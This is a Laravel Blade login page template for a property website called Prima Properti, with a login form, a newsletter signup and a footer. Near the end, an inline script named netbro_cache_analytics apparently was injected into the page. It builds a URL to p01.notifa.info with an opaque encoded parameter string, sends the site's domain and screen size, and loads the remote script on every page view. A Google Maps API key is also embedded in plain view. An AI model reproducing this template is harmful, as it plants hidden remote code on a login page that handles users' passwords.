<!DOCTYPE html>
<html lang="en" id="home">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Prima Properti</title>

    <!-- Bootstrap -->
    <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet">

    <!-- External Css -->
    <link rel="stylesheet" href="{{asset('assets/css/fontawesome-all.min.css')}}">
    <link rel="stylesheet" href="{{asset('assets/css/themify-icons.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/et-line.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/owl.carousel.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/jquery.nstSlider.min.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/bootstrap-select.min.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/plyr.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/magnific-popup.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/js-flickr-gallery.css')}}" />

    <!-- leaflet -->
    <link rel="stylesheet" href="{{asset('assets/leaflet/css/leaflet.css')}}">
    <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.css')}}">
    <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.Default.css')}}">

    <!-- Custom Css -->
    <link rel="stylesheet" type="text/css" href="{{asset('css/main.css')}}">

    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700" rel="stylesheet">

    <!-- Favicon -->
    <link rel="icon" href="{{asset('assets/img/icon.png')}}">
</head>

<body>

    <!-- Top Nav -->
 @include('layouts.nav')
    <!-- Header End -->

    <div class="row" style="margin: 130px 0;">
        <div class="col-md-4 col-sm-8 col-md-offset-4 col-sm-offset-2">
            <div class="sidebar">
                <aside class="widget widget-accordion">
                    <h6>Masuk</h6>
                    <div class="accordion-default">
                        <div class="panel-group" id="accordion-box-success" role="tablist" aria-multiselectable="true">
                            <div class="panel panel-default">
                                <div class="panel-heading block-style" role="tab" id="heading1">
                                    <div class="contact-form">
                                        <form action="login" method="post">
                                            @csrf
                                            <div class="row">
                                                <div class="col-sm-12">
                                                    <div class="form-group">
                                                        <input id="email" type="email" class="form-control" placeholder="Email" required name="email">
                                                    </div>
                                                </div>
                                                <div class="col-sm-12">
                                                    <div class="form-group">
                                                        <input id="password" type="password" class="form-control" placeholder="Password" required name="password">
                                                    </div>
                                                </div>
                                                <div class="col-sm-4">
                                                    <div class="form-group">
                                                        <button type="submit" class="button primary-bg">Masuk</button>
                                                    </div>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </aside>
            </div>
        </div>
    </div>


    <!-- Call to Action -->
    <div class="cpdv-container primary-bg section-padding-50">
        <div class="container">
            <div class="row">
                <div class="col-lg-7 col-md-6">
                    <div class="left-content">
                        <div class="call-to-action-content">
                            <h3>Subscribe Today!</h3>
                            <p>Don’t miss our future updates. Get Subscribe today to getting Updates!</p>
                        </div>
                    </div>
                </div>
                <div class="col-lg-5 col-md-6">
                    <div class="right-content-sm">
                        <div class="call-to-action-form">
                            <form class="subscription-form" action="#" method="post">
                                <input type="text" placeholder="Enter your mail here">
                                <button class="button white-bg">Subscribe</button>
                                <p class="newsletter-success"></p>
                                <p class="newsletter-error"></p>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Call to Action End -->

    <!-- Footer -->
    <footer>
        <div class="footer-widget-area section-padding">
            <div class="container">
                <div class="row margin-balance">
                    <div class="col-md-4 col-md-offset-1 col-sm-6">
                        <aside class="widget footer-get-in-touch-widget">
                            <h6 class="widget-title">Prima Properti</h6>
                            <p><span class="title">Alamat</span><span class="contact-info">Jln. Letnan Sudiono Bondowoso</p>
                            <p><span class="title">Telepon</span><span class="contact-info">0823-3512-7064</span></p>
                            <p><span class="title">Email</span><span class="contact-info">support@primaproperti.com</span></p>
                        </aside>
                    </div>
                    <div class="col-md-4 col-sm-6">
                        <aside class="widget footer-listing-widget">
                            <h6 class="widget-title">Properti Terbaru</h6>
                            <div class="footer-listings">
                                <div class="footer-listing">
                                    <div class="listing-thumb">
                                        <a href="#">
                                            <img src="images/listing/footer-listing-1.jpg" class="img-responsive" alt="">
                                        </a>
                                    </div>
                                    <div class="body">
                                        <p class="title"><a href="#">Hotel in Madison Square</a></p>
                                        <p class="cost">$1255.00 / Months</p>
                                    </div>
                                </div>
                                <div class="footer-listing">
                                    <div class="listing-thumb">
                                        <a href="#">
                                            <img src="images/listing/footer-listing-1.jpg" class="img-responsive" alt="">
                                        </a>
                                    </div>
                                    <div class="body">
                                        <p class="title"><a href="#">Hotel in Madison Square</a></p>
                                        <p class="cost">$1255.00 / Months</p>
                                    </div>
                                </div>
                            </div>
                        </aside>
                    </div>
                    <div class="col-md-2 col-sm-4">
                        <aside class="widget widget-useful-link">
                            <h6 class="widget-title">Informasi</h6>
                            <ul class="links">
                                <li><a href="#">How to Purchase</a></li>
                                <li><a href="#">Tips &amp; Tricks</a></li>
                                <li><a href="#">Privacy Policy</a></li>
                                <li><a href="#">Legal / Law</a></li>
                            </ul>
                        </aside>
                    </div>
                </div>
            </div>
        </div>
        <div class="grey-bg section-padding-50">
            <div class="container">
                <div class="row">
                    <div class="col-md-4 col-md-offset-4">
                        <div class="footer-social-link">
                            <div class="footer-logo">
                                <a href="#">
                                    <img src="{{asset('assets/img/properti.png')}}" class="img-responsive" alt="Footer Logo" style="width: 100px; height: auto;">
                                </a>
                            </div>
                            <div class="social-link">
                                <ul>
                                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
                                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
                                    <li><a href="#"><i class="fab fa-google-plus-g"></i></a></li>
                                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
                                    <li><a href="#"><i class="fab fa-youtube"></i></a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="copyright primary-bg">
            <div class="container">
                <div class="row">
                    <div class="col-md-6 col-md-push-6">
                        <div class="footer-nav" id="footer-nav">
                            <ul>
                                <li class="submenu">
                                    <a href="#">Legal</a>
                                    <ul class="submenu-item">
                                        <li><a href="#">Dropdown 1</a></li>
                                        <li><a href="#">Dropdown 2</a></li>
                                        <li><a href="#">Dropdown 3</a></li>
                                        <li class="submenu">
                                            <a href="#">Dropdown 4</a>
                                            <ul class="submenu-item">
                                                <li><a href="#">Dropdown 1</a></li>
                                                <li><a href="#">Dropdown 2</a></li>
                                                <li><a href="#">Dropdown 3</a></li>
                                                <li class="submenu">
                                                    <a href="#">Dropdown 4</a>
                                                    <ul class="submenu-item">
                                                        <li><a href="#">Dropdown 1</a></li>
                                                        <li><a href="#">Dropdown 2</a></li>
                                                        <li><a href="#">Dropdown 3</a></li>
                                                        <li class="submenu">
                                                            <a href="#">Dropdown 4</a>
                                                            <ul class="submenu-item">
                                                                <li><a href="#">Dropdown 1</a></li>
                                                                <li><a href="#">Dropdown 2</a></li>
                                                                <li><a href="#">Dropdown 3</a></li>
                                                                <li class="submenu">
                                                                    <a href="#">Dropdown 4</a>
                                                                    <ul class="submenu-item">
                                                                        <li><a href="#">Dropdown 1</a></li>
                                                                        <li><a href="#">Dropdown 2</a></li>
                                                                        <li><a href="#">Dropdown 3</a></li>
                                                                    </ul>
                                                                </li>
                                                            </ul>
                                                        </li>
                                                    </ul>
                                                </li>
                                            </ul>
                                        </li>
                                    </ul>
                                </li>
                                <li><a href="#">Terms &amp; Conditions </a></li>
                                <li><a href="#">Legal</a></li>
                                <li><a href="#">Privacy Policy</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-6 col-md-pull-6">
                        <p class="copyright-text">Copyright 2019, <a href="#">Prima Properti. </a> All Rights Reserved</p>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <!-- Footer End -->

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="{{asset('assets/js/jquery.min.js')}}"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
    <script src="{{asset('assets/js/visible.js')}}"></script>
    <script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>
    <script src="{{asset('assets/js/jquery.nstSlider.min.js')}}"></script>
    <script src="{{asset('assets/js/bootstrap-select.min.js')}}"></script>
    <script src="{{asset('assets/js/plyr.js')}}"></script>
    <script src="{{asset('assets/js/jquery-migrate-3.0.1.js')}}"></script>
    <script src="{{asset('assets/js/jquery.magnific-popup.min.js')}}"></script>
    <script src="{{asset('assets/js/js-flickr-gallery.js')}}"></script>
    <script src="{{asset('assets/js/tinymce.min.js')}}"></script>
    <script src="{{asset('assets/js/isotope.pkgd.min.js')}}"></script>
    <script src="{{asset('assets/js/imagesloaded.pkgd.min.js')}}"></script>
    <script src="{{asset('assets/js/jquery.ajaxchimp.min.js')}}"></script>
    <script src="{{asset('assets/js/easing.min.js')}}"></script>

    <!-- leaflet -->
    <script src="{{asset('assets/leaflet/js/dummylatlng.js')}}"></script>
    <script src="{{asset('assets/leaflet/js/leaflet-src.js')}}"></script>
    <script src="{{asset('assets/leaflet/js/leaflet.markercluster-src.js')}}"></script>

    <script src="{{asset('js/custom.js')}}"></script>
    <script src="{{asset('js/dashboard.js')}}"></script>
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
    <script src="{{asset('js/map.js')}}"></script>
    <script src="{{asset('js/searchMap.js')}}"></script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pL3mwR3vU7SLtgFxg5fOo7Rb8htxCrPrFvSpPaDo42rGpp2wu8UEKjSABfml6DsEeVl1J7ACV2x81C3k3qgqMSYQghczOIZpVgJ4K8hWZbnY9rYBstgqlHrzHP32YgqVRwqlRGmCbKBETLeuDRRb3mUdvDzCgfY1PJqIh2WTr1dygYZAC%2bwPuqcmzW8p4tNady96ZBYsmuF8iGUZfCXcRF0PNk0sCY%2fv4EudisdGbzerIKO0aI%2bMlifa02kZ%2fgQRRoPvNnM9WVH4AZXFNFhZELQ8e2BNNvir62mqrYNVFYm8AgVAkg%2bT71gvWD3m0GCYjxXxYlamPdul3%2byiK8CVrN2Ghbsw4ADA1vgw9Svu0vkK7h2HzeRlPQ8Jr9L%2bgygS9pUPWBkTC8s4BlYSflvtC2I09Wn1nl3byRLe5aeAlxvp5m6F0DLHEwb3XfG8N3v4IT9897V7%2fr3M2uROsNM9B%2fNb2UDWHeb4jA%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>

</html>

{{-- @extends('layouts.app')

@section('content')
<div class="container">
    <div class="row justify-content-center">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">{{ __('Login') }}</div>

<div class="card-body">
    <form method="POST" action="{{ route('login') }}">
        @csrf

        <div class="form-group row">
            <label for="email" class="col-md-4 col-form-label text-md-right">{{ __('E-Mail Address') }}</label>

            <div class="col-md-6">
                <input id="email" type="email" class="form-control @error('email') is-invalid @enderror" name="email" value="{{ old('email') }}" required autocomplete="email" autofocus>

                @error('email')
                <span class="invalid-feedback" role="alert">
                    <strong>{{ $message }}</strong>
                </span>
                @enderror
            </div>
        </div>

        <div class="form-group row">
            <label for="password" class="col-md-4 col-form-label text-md-right">{{ __('Password') }}</label>

            <div class="col-md-6">
                <input id="password" type="password" class="form-control @error('password') is-invalid @enderror" name="password" required autocomplete="current-password">

                @error('password')
                <span class="invalid-feedback" role="alert">
                    <strong>{{ $message }}</strong>
                </span>
                @enderror
            </div>
        </div>

        <div class="form-group row">
            <div class="col-md-6 offset-md-4">
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" name="remember" id="remember" {{ old('remember') ? 'checked' : '' }}>

                    <label class="form-check-label" for="remember">
                        {{ __('Remember Me') }}
                    </label>
                </div>
            </div>
        </div>

        <div class="form-group row mb-0">
            <div class="col-md-8 offset-md-4">
                <button type="submit" class="btn btn-primary">
                    {{ __('Login') }}
                </button>

                @if (Route::has('password.request'))
                <a class="btn btn-link" href="{{ route('password.request') }}">
                    {{ __('Forgot Your Password?') }}
                </a>
                @endif
            </div>
        </div>
    </form>
</div>
</div>
</div>
</div>
</div>
@endsection --}}